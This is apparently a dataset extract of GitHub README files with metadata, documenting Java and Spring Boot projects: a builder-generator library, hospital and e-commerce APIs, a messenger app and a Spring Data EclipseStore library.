Implements a step builder pattern,
requiring fields
to be set in a structured sequence
defined by the selected constructor's parameters and explicitly marked mandatory fields
(see [Mandatory Fields](#Mandatory-Fields)).
Each step must be completed before proceeding to the next,
ensuring all fields are set before the object can be constructed.

```java
@Buildable(strategy = STEP_WISE)
class Car {
```

#### Strict
Requires all mandatory fields to be explicitly set.
If a field is not set,
or is set to null, the builder throws a `MandatoryFieldMissingException`.
This ensures that the object is fully initialized.

```java
@Buildable(strategy = STRICT)
class Car {
```

#### Allow Nulls
Enables setting mandatory fields to null explicitly,
combinable with `STRICT` and `STEP_WISE`.
If a field is omitted, the builder will throw a `MandatoryFieldMissingException`,
maintaining strict initialization but allowing null values for flexibility.

```java
@Buildable(strategy = { STRICT, ALLOW_NULLS })
class Car {
```
### Mandatory Fields

Fields can be marked as mandatory;
- through the `mandatoryFields` property of `@Buildable`
- through annotating the field with @Buildable.Mandatory.
 
Similar to the constructor parameters in the ENFORCED mode,
the omission of these required fields when building an object will trigger a MandatoryFieldMissingException.
This mechanism ensures that all necessary fields are set before an object is finalized.

```java
@Buildable(mandatoryFields = {""color""})
public class Car {
    private String color;
```

```java
@Buildable
public class Car {
    @Buildable.Mandatory
    private String color;
```
### Change Default Package
    
A `CarBuilder` class will be generated in the same package as the source class with *builder* as suffix.
For the car example this will be `my.garage.CarBuilder`

The location of the builder can be changed:

```java
@Buildable(packageName = ""my.other.garage"")
public class Car {
```

### Static Factory Method name

The `factoryName` `@Buildable` property allows:
- `STEP_WISE`: Rename builder starting method (e.g., builder to createProductBuilder).
- `PERMISSIVE/STRICT`: Add extra name to static factory method (for documentation/avoid conflicts).

```java
@Buildable(strategy = STEP_WISE, factoryName = ""car"")
public class Car {
```
Which will generate:
```java
CarBuilder.car();
```

### Pickup setter methods as buildable

When Bob encounters setters (with or without the set prefix)
and a corresponding field it will add the fields to the final builder.

In the below example,
if though `color` is not part of the constructor it will be part of the final generated Builder
because there is a setter available, which will be used.

```java
@Buildable
public class Car {
    private Brand brand;
    private String color;

    public Car(Brand brand) {
        this.brand = brand;
    }
	
    public void color(String color) {
        this.color = color;
    }
}
```
            
### Field exclusion

```java
@Buildable(excludeFields = {""brand"", ""color""})
public class Car {
```

### Setter prefix
      
By default Bob will generated setter methods consisting out of *new style setters* (`name(String name)` instead of `setName(String name)` or the default builder pattern setter style `withName(String name)`)
If you want to change the prefix of those setter methods you can:

```java
@Buildable(setterPrefix = ""with"")
public class Car {
```

### Records

Bob can work with Records and function just as normal java classes

```java
@Buildable
public record Record(String name, int age) {
}
```

### Generics

Bob is not afraid of generics

```java
@Buildable
public class Cup<T, R extends String> {
    private T contents;
    private R topping;
```

Can be used as:
    
```java
Cup<BigDecimal, String> string = new CupBuilder<BigDecimal, String>().topping(""cream"")
    .contents(BigDecimal.ZERO)
    .build();
```

or alternatively:

```java
CupBuilder.of(BigDecimal.class, String.class)
    .topping(""cream"")
    .contents(BigDecimal.ZERO)
    .build();
```
",6,5,1,17.0,"['maven', 'central', 'http', 'https', 'license', 'http', 'https', 'why', 'bob', 'installation', 'maven', 'gradle', 'get', 'start', 'usage', 'basic', 'usage', 'different', 'constructor', 'builder', 'strategy', 'permissive', 'step', 'wise', 'strict', 'allow', 'null', 'mandatory', 'field', 'change', 'default', 'package', 'static', 'factory', 'method', 'name', 'pickup', 'setter', 'method', 'buildable', 'field', 'exclusion', 'setter', 'prefix', 'record', 'generic']","['maven', 'http', 'https', 'usage', 'field']",3.0,"[com.diffplug.spotless:spotless-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,2.0,1.0
MirnaGama/hospital-management-api,master,"# Hospital Management - API Module ![Build Status](https://github.com/MirnaGama/hospital-management-api/actions/workflows/maven.yml/badge.svg)

## About the project
Hospital Management API built in Spring Boot

### Prerequisites:
- Spring Boot 3.2.1 
- JDK 17
- Maven 4.0.0

### Running the application
1. `git clone https://github.com/MirnaGama/hospital-management-api/`
2. `cd hospital-management-api`
3. `mvn clean install`<br>
It will build the jar file in the target folder
4. `mvn spring-boot:run`<br>
It will compile and run the application on default port (8080)

### Running tests
- `mvn test`<br>
It will executes all the tests.

- `mvn -Dtest=packageName.className test`<br>
It will execute only one test class

- `mvn -Dtest=packageName.className#methodName test`<br>
It will run only one test method from one test class

### Features - v1.0
- [X] R1 - Doctor Registration
- [X] R2 - List of Doctors
- [X] R3 - Doctor Update
- [X] R4 - Doctor Exclusion
- [X] R5 - Patient Registration
- [X] R6 - List of Patients
- [X] R7 - Patient Update
- [X] R8 - Patient Exclusion
- [X] R9 - Consultation Scheduling
- [X] R10 - Consultation Cancellation

## API Documentation - /swagger-ui/index.html

### authentication

#### POST - [**/api/auth/register**] - Register a new user

- **Body:**
```
{   
    ""login"" (string, required),  
    ""password"" (string, required), 
}
```

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |

#### POST - [**/api/auth/login**] - Perform the login

- **Body:**
```
{   
    ""login"" (string, required),  
    ""password"" (string, required), 
}
```

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |
| `403` | _Incorrect credentials_ | 


### doctors

#### POST - [**/api/v1.0/doctors**] - Adds a new doctor

- **Body:**
```
{   
    ""name"" (string, required),  
    ""email"" (string, required),  
    ""crm"" (string, required),  
    ""telephone"" (string, required), 
    ""specialty"" (string, required), 
    ""address"": {   
        ""street"" (string, required),
        ""neighborhood"" (string, required), 
        ""zipCode"" (string, required),  
        ""city"" (string, required),  
        ""state"" (string, required),
        ""additionalDetails"" (string, optional),  
        ""houseNumber"" (string, optional)
    } 
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `201` | _Successfully created_ |
| `400` | _Validation Error_ |
| `403` | _Unauthorized / Invalid token_ | 

#### GET - [**/api/v1.0/doctors/{id}**] - Get an existing doctor

- **Response Body Example:**
```
{
    ""id"": 1,
    ""name"": ""DOCTOR TEST"",
    ""email"": ""test@gmail.com"",
    ""crm"": ""12456"",
    ""telephone"": ""(81) 99999999"",
    ""specialty"": ""ORTHOPEDICS"",
    ""active"": true,
    ""address"": {
        ""street"": ""TEST STR."",
        ""neighborhood"": ""TEST NEIGHBORHOOD"",
        ""zipCode"": ""12345678"",
        ""city"": ""TEST CITY"",
        ""state"": ""ST"",
        ""additionalDetails"": null,
        ""houseNumber"": null
    }
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `id` | _Unique identifier of the doctor who will be fetched_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `404` | _Entity not found_ |
| `403` | _Unauthorized / Invalid token_ | 

#### GET - [**/api/v1.0/doctors**] - Get a list of doctors

- **Response Body Example:**
```
{
    ""content"": [
        {
            ""name"": ""Test1"",
            ""email"": ""test1@gmail.com"",
            ""crm"": ""123456"",
            ""specialty"": ""ORTHOPEDICS""
        },
        {
            ""name"": ""Test2"",
            ""email"": ""test2@gmail.com"",
            ""crm"": ""789101"",
            ""specialty"": ""ORTHOPEDICS""
        },
        {
            ""name"": ""Test3"",
            ""email"": ""test3@gmail.com"",
            ""crm"": ""112131"",
            ""specialty"": ""ORTHOPEDICS""
        },
    ],
    ""pageable"": {
        ""pageNumber"": 0,
        ""pageSize"": 10,
        ""sort"": {
            ""sorted"": true,
            ""unsorted"": false,
            ""empty"": false
        },
        ""offset"": 0,
        ""paged"": true,
        ""unpaged"": false
    },
    ""totalPages"": 1,
    ""totalElements"": 3,
    ""last"": true,
    ""sort"": {
        ""sorted"": true,
        ""unsorted"": false,
        ""empty"": false
    },
    ""number"": 0,
    ""size"": 10,
    ""first"": true,
    ""numberOfElements"": 3,
    ""empty"": false
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `size` | _Number of records that should be returned_ |
| `sort` | _Sort by object attribute in descending order_ |
| `page` | _Page number_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `403` | _Unauthorized / Invalid token_ | 


#### PUT - [**/api/v1.0/doctors**] - Updates an existing doctor

- **Body:**
```
{   
    ""id"" (number, required),
    ""name"" (string, optional), 
    ""telephone"" (string, optional),  
    ""address"": {   
        ""street"" (string, optional),
        ""neighborhood"" (string, optional), 
        ""zipcode"" (string, optional),  
        ""city"" (string, optional),  
        ""state"" (string, optional),
        ""additionalDetails"" (string, optional),  
        ""houseNumber"" (string, optional),
    } 
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |
| `403` | _Unauthorized / Invalid token_ | 


#### DELETE - [**/api/v1.0/doctors/{id}**] - Deactivates an existing doctor

- **Response Body Example:**
```
{
    ""id"": 2,
    ""name"": ""DEACTIVATED DOCTOR TEST"",
    ""email"": ""test@gmail.com"",
    ""crm"": ""12456"",
    ""telephone"": ""(81) 99999999"",
    ""specialty"": ""ORTHOPEDICS"",
    ""active"": false,
    ""address"": {
        ""street"": ""TEST STR."",
        ""neighborhood"": ""TEST NEIGHBORHOOD"",
        ""zipCode"": ""12345678"",
        ""city"": ""TEST CITY"",
        ""state"": ""ST"",
        ""additionalDetails"": null,
        ""houseNumber"": null
    }
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `id` | _Unique identifier of the doctor who will be deactivated_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |
| `404` | _Entity not found_ |
| `403` | _Unauthorized / Invalid token_ | 

### patients

#### POST - [**/api/v1.0/patients**] - Adds a new patient

- **Body:**
```
{   
    ""name"" (string, required),  
    ""email"" (string, required),  
    ""cpf"" (string, required),  
    ""telephone"" (string, required), 
    ""address"": {   
        ""street"" (string, required),
        ""neighborhood"" (string, required), 
        ""zipCode"" (string, required),  
        ""city"" (string, required),  
        ""state"" (string, required),
        ""additionalDetails"" (string, optional),  
        ""houseNumber"" (string, optional)
    } 
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `201` | _Successfully created_ |
| `400` | _Validation Error_ |
| `403` | _Unauthorized / Invalid token_ | 


#### GET - [**/api/v1.0/patients/{id}**] - Get an existing patient

- **Response Body Example:**
```
{
    ""id"": 1,
    ""name"": ""PATIENT TEST"",
    ""email"": ""test@gmail.com"",
    ""cpf"": ""11111111111"",
    ""telephone"": ""(81) 99999999"",
    ""active"": true,
    ""address"": {
        ""street"": ""TEST STR."",
        ""neighborhood"": ""TEST NEIGHBORHOOD"",
        ""zipCode"": ""12345678"",
        ""city"": ""TEST CITY"",
        ""state"": ""ST"",
        ""additionalDetails"": null,
        ""houseNumber"": null
    }
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `id` | _Unique identifier of the patient who will be fetched_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `404` | _Entity not found_ |
| `403` | _Unauthorized / Invalid token_ | 

#### GET - [**/api/v1.0/patients**] - Get a list of patients

- **Response Body Example:**
```
{
    ""content"": [
        {
            ""name"": ""Test1"",
            ""email"": ""test1@gmail.com"",
            ""cpf"": ""123456""
        },
        {
            ""name"": ""Test2"",
            ""email"": ""test2@gmail.com"",
            ""cpf"": ""789101""
        },
        {
            ""name"": ""Test3"",
            ""email"": ""test3@gmail.com"",
            ""cpf"": ""112131""
        },
    ],
    ""pageable"": {
        ""pageNumber"": 0,
        ""pageSize"": 10,
        ""sort"": {
            ""sorted"": true,
            ""unsorted"": false,
            ""empty"": false
        },
        ""offset"": 0,
        ""paged"": true,
        ""unpaged"": false
    },
    ""totalPages"": 1,
    ""totalElements"": 3,
    ""last"": true,
    ""sort"": {
        ""sorted"": true,
        ""unsorted"": false,
        ""empty"": false
    },
    ""number"": 0,
    ""size"": 10,
    ""first"": true,
    ""numberOfElements"": 3,
    ""empty"": false
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `size` | _Number of records that should be returned_ |
| `sort` | _Sort by object attribute in descending order_ |
| `page` | _Page number_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `403` | _Unauthorized / Invalid token_ | 

#### PUT - [**/api/v1.0/patients**] - Updates an existing patient

- **Body:**
```
{   
    ""id"" (number, required),
    ""name"" (string, optional), 
    ""telephone"" (string, optional),  
    ""address"": {   
        ""street"" (string, optional),
        ""neighborhood"" (string, optional), 
        ""zipcode"" (string, optional),  
        ""city"" (string, optional),  
        ""state"" (string, optional),
        ""additionalDetails"" (string, optional),  
        ""houseNumber"" (string, optional),
    } 
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |
| `403` | _Unauthorized / Invalid token_ | 

#### DELETE - [**/api/v1.0/patients/{id}**] - Deactivates an existing patient

- **Response Body Example:**
```
{
    ""id"": 1,
    ""name"": ""DEACTIVATED PATIENT TEST"",
    ""email"": ""test@gmail.com"",
    ""cpf"": ""11111111111"",
    ""telephone"": ""(81) 99999999"",
    ""active"": false,
    ""address"": {
        ""street"": ""TEST STR."",
        ""neighborhood"": ""TEST NEIGHBORHOOD"",
        ""zipCode"": ""12345678"",
        ""city"": ""TEST CITY"",
        ""state"": ""ST"",
        ""additionalDetails"": null,
        ""houseNumber"": null
    }
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `id` | _Unique identifier of the patient who will be deactivated_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `400` | _Validation Error_ |
| `404` | _Entity not found_ |
| `403` | _Unauthorized / Invalid token_ | 

### consultations

#### POST - [**/api/v1.0/consultations**] - Adds a new consultation

- **Body:**
```
{   
    ""patientId"" (number, required),  
    ""consultationDate"" (string, required),  
    ""doctorId"" (number, required if _specialty_ field is not filled),
    ""specialty"" (string, required if _doctorId_ field is not filled)
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `201` | _Successfully created_ |
| `400` | _Validation Error_ |
| `403` | _Unauthorized / Invalid token_ | 
| `404` | _Entity not found_ |

#### GET - [**/api/v1.0/consultations/{id}**] - Get an existing consultation

- **Response Body Example:**
```
{
    ""id"": 1,
    ""consultationDate"": ""22/04/2024 10:34"",
    ""patient"": {...},
    ""doctor"": {...},
    ""canceled"": false,
    ""reasonCancellation: """"
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Request Parameters:**

| Key  | Description |
| ------------- | ------------- |
| `id` | _Unique identifier of the consultation that will be fetched_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `404` | _Entity not found_ |
| `403` | _Unauthorized / Invalid token_ | 

#### DELETE - [**/api/v1.0/consultations**] - Cancels a scheduled consultation

- **Body:**
```
{   
    ""consultationId"" (number, required),  
    ""reasonCancellation"" (string, required),  
}
```

- **Request Headers:**

| Key  | Description |
| ------------- | ------------- |
| `Authorization` | _Authorization token_ |

- **Responses:**

| Code  | Description |
| ------------- | ------------- |
| `200` | _Successful operation_ |
| `403` | _Unauthorized / Invalid token_ | 
| `404` | _Entity not found_ |
",0,0,12,11.0,"['hospital', 'management', 'api', 'module', 'build', 'status', 'http', 'about', 'project', 'prerequisite', 'run', 'application', 'run', 'test', 'feature', 'api', 'documentation', 'authentication', 'post', 'register', 'new', 'user', 'post', 'perform', 'login', 'doctor', 'post', 'add', 'new', 'doctor', 'get', 'id', 'get', 'existing', 'doctor', 'get', 'get', 'list', 'doctor', 'put', 'update', 'exist', 'doctor', 'delete', 'id', 'deactivate', 'exist', 'doctor', 'patient', 'post', 'add', 'new', 'patient', 'get', 'id', 'get', 'exist', 'patient', 'get', 'get', 'list', 'patient', 'put', 'update', 'exist', 'patient', 'delete', 'id', 'deactivate', 'exist', 'patient', 'consultation', 'post', 'add', 'new', 'consultation', 'get', 'id', 'get', 'exist', 'consultation', 'delete', 'cancel', 'schedule', 'consultation']","['get', 'doctor', 'exist', 'patient', 'post']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
EmbarkXOfficial/Spring-Security-Course,main,"ï»¿# Welcome to Spring Security Course from Basic to Advance


GROW AS JAVA DEVELOPER
1. SIGNUP FOR MY SPRING BOOT FOR BEGINNERS COURSE: http://link.embarkx.com/spring-boot
2. LEARN JAVA WITH 60+ HOURS OF CONTENT: http://link.embarkx.com/java
3. MASTER INTELLIJ IDEA: http://link.embarkx.com/intellij
",0,0,1,1.0,"['welcome', 'spring', 'security', 'course', 'basic', 'advance']","['welcome', 'spring', 'security', 'course', 'basic']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
DJ-Raven/java-messenger,main,"# Java Messenger

This is a simple messenger app built using Java Swing for the client-side GUI, Node.js for the server-side API, and Socket-IO for real-time communication. The graphical user interface (GUI) is styled using FlatLaf.

**This project is still in development.**

<img src=""https://github.com/DJ-Raven/java-messenger/blob/main/screenshot/sample-2.png?raw=true"" alt=""sample 2"" width=""400""/>&nbsp;
<img src=""https://github.com/DJ-Raven/java-messenger/blob/main/screenshot/sample-3.png?raw=true"" alt=""sample 3"" width=""400""/>&nbsp;

## Demo
[Download Demo Test](messenger-client/demo/messenger-test-1.4.0.jar?raw=true)

Run demo with `java -jar messenger-test-<version>.jar` or `double-click` (Requires Java 8 or newer)

### Client libraries used (Java)
| Name | GitHub |
| ------------ | ------------ |
| FlatLaf | https://github.com/JFormDesigner/FlatLaf |
| MiG Layout | https://github.com/mikaelgrev/miglayout |
| REST Assured | https://github.com/rest-assured/rest-assured |
| Socket.IO Java client | https://github.com/socketio/socket.io-client-java |
| JSON-Java | https://github.com/stleary/JSON-java?tab=readme-ov-file |
| JLayer | https://github.com/umjammer/jlayer |
| mp3agic | https://github.com/mpatric/mp3agic |
| Thumbnailator | https://github.com/coobird/thumbnailator |
| Swing Modal Dialog | https://github.com/DJ-Raven/swing-modal-dialog |
### Server libraries used (Nodejs)
| Name | GitHub |
| ------------ | ------------ |
| Express | https://github.com/expressjs/express |
| socket.io | https://github.com/socketio/socket.io |
| jsonwebtoken | https://github.com/auth0/node-jsonwebtoken |
| bcrypt.js | https://github.com/dcodeIO/bcrypt.js |
| BlurHash | https://github.com/woltapp/blurhash/tree/master |
| Multer | https://github.com/expressjs/multer |
| MySQL2 | https://github.com/sidorares/node-mysql2 |
| nodemon `dev`| https://github.com/remy/nodemon |
| and more ... |  |
",0,0,1,3.0,"['java', 'messenger', 'demo', 'client', 'library', 'use', 'java', 'server', 'library', 'use', 'nodejs']","['java', 'library', 'use', 'messenger', 'demo']",1.0,[],0.0,1.0,0.0
amol9372/ecommerce-spring-boot-backend-apis,master,"
# Spring boot Ecommerce Backend APIs
Ecommerce website based on microservices architecture in spring boot 3

- This project contains backend APIs for ecommerce with different microservices
- It contains all the functionalities like product inventory, variance, cart, checkout, websockets etc
- All the APIs are constructed with Spring boot 3

## Application architecture

![api gateway flow](https://github.com/amol9372/ecommerce-spring-boot-backend-apis/assets/20081129/a432fac4-ce61-4cca-a64c-aa459d525c2a)

## Postman collection (Public)
```
https://www.postman.com/galactic-eclipse-361945/workspace/public-9372/collection/1877749-6742d038-c937-4aac-838e-7e30ff85865d?action=share&creator=1877749
```
## Server Events (ADMIN user only)

In Postman use the below url to recieve server side events

```curl
ws://localhost:8091/ws/events
```

## Features

- Authentication with Jwt
- Add/remove products
- Create categories with hierarchy
- Manage address
- Feature template
- Shopping cart
- Checkout page
- Server Events page

## Tech stack

- Java 17
- Spring boot 3
- Elasticsearch 8
- Spring data JPA
- Postgres 14
- Spring cloud gateway
- Docker (docker-compose)

## ER Diagram

<img width=""1676"" alt=""Pasted Graphic"" src=""https://github.com/amol9372/ecommerce-spring-boot-backend-apis/assets/20081129/94d43c0d-2d2e-40be-a44d-dec762b3ffb2"">

## API Root Endpoint

### Spring cloud Gateway

`https://localhost:8091`

### Microservice Endpoints

| Service  | Base URL                           |
|----------|-------------------------------|
| User     | `https://localhost:8080/api`  |
| Product  | `https://localhost:8081/api`  |
| Cart     | `https://localhost:8082/api`  |
| Order    | `https://localhost:8083/api`  |


### Swagger endpoints
| Type  | Endpoint                      |
|----------|-------------------------------|
| Api docs   | `/api/docs`  |
| Swagger UI | `/swagger-ui`  |

## Run Application locally

1. Clone repository

```bash
  git clone git@github.com:amol9372/ecommerce-spring-boot-backend-apis.git
```
2. Set docker & elastic search credentials

```bash
  ./.env and set the Postgres & ElasticSearch credentials
```

3. Go to `ecomm-db` and set the postgres credentials in Dockerfile. Also make sure postgres-data folder is present.         

```bash
./ecomm-db/Dockerfile

-rw-r--r--@  1 amolsingh  staff   139  5 Feb 19:15 Dockerfile
-rw-r--r--@  1 amolsingh  staff  9408  5 Feb 19:15 ecomm.sql
drwxr-xr-x@  2 amolsingh  staff    64  5 Feb 19:16 postgres-data
drwxr-xr-x@  5 amolsingh  staff   160  5 Feb 19:16 .
drwxr-xr-x@ 14 amolsingh  staff   448  5 Feb 19:44 ..
```
4. Run the docker compose command

```bash
./start-services.sh
```
5. Create elastic search index `productv1` using the following command

```bash
./create-index.sh
```
## Onboarding

### APIs setup
Import above postman collection (create a fork also) and lets do the basic setup

#### Register User

- Use the `/auth/register` API to register user in the application
- The above user will have `USER` role. 
- Admin user is already created in the application with below credentials in `users` table

 | email  | password                           |
|----------|-------------------------------|
| admin@example.com     | `password`  |

#### Authenticate user & Get JWT
Use the `/auth/login`  API to authenticate user and get the credentials (jwt token + userinfo)

```json
{
    ""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwicm9sZXMiOlsiQURNSU4iXSwic3ViIjoiYXBwfDk4ZWI2NzRkYTdjNzMzYjIxYWMwZTBkYiIsImlhdCI6MTcwNzMxODY2MywiZXhwIjoxNzA3MzI1ODYzfQ.qEulnxe9IQfOFzO-6F1l81kvy61cNvo4ub3MdurX1Ec"",
    ""userInfo"": {
        ""sub"": ""app|98eb674da7c733b21ac0e0db"",
        ""name"": ""admin@example.com"",
        ""picture"": null,
        ""email"": ""admin@example.com"",
        ""nickname"": ""admin"",
        ""email_verified"": false
    }
}
```
Use the `token` as in Authorization header for all APIs

#### Headers

Header values are set in `collection variables` 
- Authorization (with bearer token)
- x-token-type (default as `app`) 

#### Reference data 

As a part of starting docker containers, reference data is already created in below entities: 

| Entity            | API                                       | DB Table         |
|-------------------|-------------------------------------------|------------------|
| Category          | `/admin/category`                         | `category`       |
| Feature Template  | `/admin/feature-template/{categoryId}`    | `feature_template`|
| Variant Features  | `/admin/variant/{categoryId}`             | `master_variant` |

## Feature Templates & Product Variants

The application uses the concept of feature templates & product variants

A `feature template` is a list of base line features which a product has
eg - A laptop will have base features as 

| Feature            | Details                             |
|--------------------------|-------------------------------------|
| Brand                    | Apple                               |
| Model Name               | MacBook Pro                         |
| Screen Size              | 14.2 Inches                         |
| CPU Model                | Unknown                             |
| Operating System         | Mac OS                              |
| Special Feature          | Fingerprint Reader                  |
| Graphics Card Description| Integrated                          |

Out of these features, only few can be a part of `variant` features. Variant features are basically what distinguishes the different SKUs of a product like color, storage, memory etc 

An example of variant features 

| Feature            | Details                             |
|--------------------------|-------------------------------------|
| RAM Memory Installed Size| 8 GB                                |
| Colour | Silver | 
| Hard Disk Size | 512 GB |
",0,0,2,1.0,"['spring', 'boot', 'ecommerce', 'backend', 'apis', 'application', 'architecture', 'postman', 'collection', 'public', 'server', 'event', 'admin', 'user', 'only', 'feature', 'tech', 'stack', 'er', 'diagram', 'api', 'root', 'endpoint', 'spring', 'cloud', 'gateway', 'microservice', 'endpoint', 'swagger', 'endpoint', 'run', 'application', 'locally', 'onboarding', 'apis', 'setup', 'register', 'user', 'authenticate', 'user', 'get', 'jwt', 'header', 'reference', 'data', 'feature', 'template', 'product', 'variant']","['user', 'endpoint', 'spring', 'apis', 'application']",5.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,5.0,0.0
xdev-software/spring-data-eclipse-store,develop,"[![Latest version](https://img.shields.io/maven-central/v/software.xdev/spring-data-eclipse-store?logo=apache%20maven)](https://mvnrepository.com/artifact/software.xdev/spring-data-eclipse-store)
[![Build](https://img.shields.io/github/actions/workflow/status/xdev-software/spring-data-eclipse-store/check-build.yml?branch=develop)](https://github.com/xdev-software/spring-data-eclipse-store/actions/workflows/check-build.yml?query=branch%3Adevelop)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=xdev-software_spring-data-eclipse-store&metric=alert_status)](https://sonarcloud.io/dashboard?id=xdev-software_spring-data-eclipse-store)
[![Documentation](https://img.shields.io/maven-central/v/software.xdev/spring-data-eclipse-store?label=docs)](https://spring-eclipsestore.xdev.software/)

<div align=""center"">
    <img src=""assets/Logo.png"" height=""200"" alt=""XDEV Spring-Data Eclipse-Store Logo"">
</div>

# spring-data-eclipse-store

A library to simplify using [EclipseStore](https://eclipsestore.io/) in the [Spring environment](https://spring.io/projects/spring-data/).

What makes this library special is, that it creates a working copy of the data.
This way EclipseStore behaves almost exactly like relational database from a coding perspective.

## Features

The library provides following features:

* Enforces the
  **[Spring data repository concept](https://docs.spring.io/spring-data/jpa/reference/repositories/core-concepts.html)**
  for EclipseStore by
  using [working copies](https://xdev-software.github.io/spring-data-eclipse-store/working-copies.html)
* **[Drop in compatible](https://xdev-software.github.io/spring-data-eclipse-store/installation.html#drop-in-compatible)** for your existing Spring application
* Utilizes **ultra-fast EclipseStore serializing and storing**
* Enables your application to **select
  any [EclipseStore target](https://docs.eclipsestore.io/manual/storage/storage-targets/index.html)** (e.g.
  [PostgreSQL](https://docs.eclipsestore.io/manual/storage/storage-targets/sql-databases/postgresql.html),
  [AWS S3](https://docs.eclipsestore.io/manual/storage/storage-targets/blob-stores/aws-s3.html) or
  [IBM COS](https://github.com/xdev-software/eclipse-store-afs-ibm-cos))
* Can save up to **99%[^1] of monthly costs** in the IBM Cloud and up to 82%[^2] in the AWS Cloud

[^1]:If the COS Connector is used in the IBM Cloud instead of a PostgreSQL and approx. 10,000 entries with a total size
of 1
GB of data are stored. ([IBM Cloud Pricing](https://cloud.ibm.com/estimator/estimates), as of 08.01.2024)

[^2]: If the S3 connector is used instead of DynamoDB under the same conditions at
AWS. ([AWS Pricing Calculator](https://calculator.aws/#/estimate?id=ab85cddf77f0d1aa0457111ed82785dfb836b1d8), as of
08.01.2024)

## Installation & Usage

[**Installation
guide** for the latest release](https://github.com/xdev-software/spring-data-eclipse-store/releases/latest#Installation)

[**Detailed
instructions** are in the documentation](https://xdev-software.github.io/spring-data-eclipse-store/installation.html)

### Supported versions

| Spring-Data-Eclipse-Store | Java   | Spring Data | EclipseStore |
|---------------------------|--------|-------------|--------------|
| ``<= 1.0.2``              | ``17`` | ``3.2.2``   | ``1.1.0``    |
| ``1.0.3/1.0.4``           | ``17`` | ``3.2.3``   | ``1.2.0``    |
| ``1.0.5-1.0.7``           | ``17`` | ``3.2.5``   | ``1.3.2``    |
| ``1.0.8-1.0.10``          | ``17`` | ``3.3.1``   | ``1.3.2``    |
| ``2.0.0-2.1.0``           | ``17`` | ``3.3.2``   | ``1.4.0``    |
| ``>= 2.2.0``              | ``17`` | ``3.3.4``   | ``1.4.0``    |

## Demo

To see how easy it is to implement EclipseStore in your Spring project, take a look at
the [demos](./spring-data-eclipse-store-demo):

* [Simple demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/simple)
* [Complex demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/complex)
* [Demo with coexisting JPA](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-jpa/src/main/java/software/xdev/spring/data/eclipse/store/jpa)
* [Dual storage demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/dual/storage)

> [!NOTE]  
> Since the library is using reflection to copy data, the following JVM-Arguments may have to be set:
> ```
> --add-opens=java.base/java.util=ALL-UNNAMED
> --add-exports java.base/jdk.internal.misc=ALL-UNNAMED
> --add-opens=java.base/java.lang=ALL-UNNAMED
